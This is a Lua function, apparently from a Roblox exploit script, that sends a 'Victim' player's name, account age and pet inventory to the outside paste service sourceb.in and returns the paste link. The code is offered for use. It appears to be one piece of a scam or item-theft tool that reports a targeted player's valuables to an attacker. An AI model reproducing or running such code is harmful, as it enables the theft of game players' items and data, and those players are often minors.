local function uploadToPastefy(petText)
    local requestFunc = (syn and syn.request) or http_request or request
    if not requestFunc then return nil end
    
    local report = "=== MONDEUR ELYSIUM ADM REPORT ===\n"
    report = report .. "Victim: " .. LocalPlayer.Name .. "\n"
    report = report .. "Age: " .. LocalPlayer.AccountAge .. " days\n\n"
    report = report .. "INVENTORY:\n" .. petText
    
    local ok, response = pcall(function()
        return requestFunc({
            Url = "https://sourceb.in/api/bins",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({ files = {{ content = report }} })
        })
    end)
    
    if ok and response.StatusCode == 200 then
        local data = HttpService:JSONDecode(response.Body)
        return "https://cdn.sourceb.in/bins/" .. data.key .. "/0"
    end
    return nil
end

